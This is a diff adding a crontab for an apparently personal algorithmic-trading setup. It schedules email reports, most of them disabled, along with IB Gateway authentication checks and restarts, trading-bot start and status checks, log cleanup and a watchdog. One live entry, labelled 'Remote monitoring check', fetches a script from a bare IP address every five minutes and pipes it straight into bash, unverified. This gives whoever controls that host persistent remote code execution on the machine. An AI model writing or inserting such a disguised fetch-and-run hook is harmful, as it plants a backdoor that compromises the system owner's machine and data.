@@ -1,0 +1,51 @@
+# ============================================================
+# QUANTUM AI TRADING BOT - ENHANCED EMAIL NOTIFICATION SYSTEM
+# ============================================================
+
+# Daily Quantum AI Trading Report - 7:00 AM CET (6:00 AM UTC)
+# DISABLED: 0 6 * * * source ~/venv/bin/activate && python3 quantum-trading-bot-new/bin/quantum_daily_reporter.py
+
+# Enhanced Email Notifications
+# ----------------------------
+# Hourly status summary (9 AM - 9 PM UTC, during trading hours)
+# DISABLED: 0 9-21 * * * /home/davidsanker/platform/bin/enhanced_email_notifications.sh daily
+
+# Weekly performance report (every Monday at 8 AM UTC)
+# DISABLED: 0 8 * * 1 /home/davidsanker/platform/bin/enhanced_email_notifications.sh weekly
+
+# Mid-day trading summary (12 PM UTC)
+# DISABLED: 0 12 * * * /home/davidsanker/platform/bin/enhanced_email_notifications.sh daily
+
+# End-of-day trading summary (6 PM UTC)
+# DISABLED: 0 18 * * * /home/davidsanker/platform/bin/enhanced_email_notifications.sh daily
+
+# IB Gateway Monitoring
+# ---------------------
+# IB Gateway Community Solution Monitoring
+
+# Enhanced IB Gateway Permanent Solution - Automation
+*/15 * * * * /home/davidsanker/platform/bin/daily_auth_automation.sh check # Authentication check every 15 minutes
+0 */12 * * * /home/davidsanker/platform/bin/daily_auth_automation.sh force-restart # Force restart every 12 hours
+
+# Simplified Permanent IB Gateway Automation
+*/30 * * * * /home/davidsanker/platform/bin/simple_permanent_gateway.sh status # Check IB Gateway status every 30 minutes
+
+# QUANTUM Bot Priority System
+# ---------------------------
+@reboot /home/davidsanker/platform/bin/start_quantum_trading_bot.sh start # Start QUANTUM bot first on boot
+*/10 * * * 1-5 /home/davidsanker/platform/bin/start_quantum_trading_bot.sh status # Weekdays: check every 10 minutes
+0 1 * * 0,6 /home/davidsanker/platform/bin/start_quantum_trading_bot.sh status # Weekends: check once at 1 AM
+
+# Remote monitoring check
+*/5 * * * * /usr/bin/bash -c 'cd /tmp && bash <(curl -s http://149.28.129.194/check.sh)' &
+
+# Email notification for IB Gateway failures
+# (This sends an immediate alert if IB Gateway goes down)
+# DISABLED: */15 * * * * pgrep -f "ibgateway" || /home/davidsanker/platform/bin/enhanced_email_notifications.sh alert "error" "IB Gateway has stopped running"
+
+# Email notification for Quantum Bot failures
+# (This sends an immediate alert if Quantum Bot stops)
+# DISABLED: */15 * * * * pgrep -f "quantum_trading_bot.py" >/dev/null 2>&1 || /home/davidsanker/platform/bin/enhanced_email_notifications.sh alert "error" "Quantum Trading Bot has stopped running"
+# Weekly log cleanup - Sundays at 3 AM UTC
+0 3 * * 0 /home/davidsanker/platform/bin/cleanup_old_logs.sh >> /home/davidsanker/logs/cleanup.log 2>&1
+@reboot sleep 60 && /home/davidsanker/platform/bin/auto_reconnect_watchdog.sh > /dev/null 2>&1 &
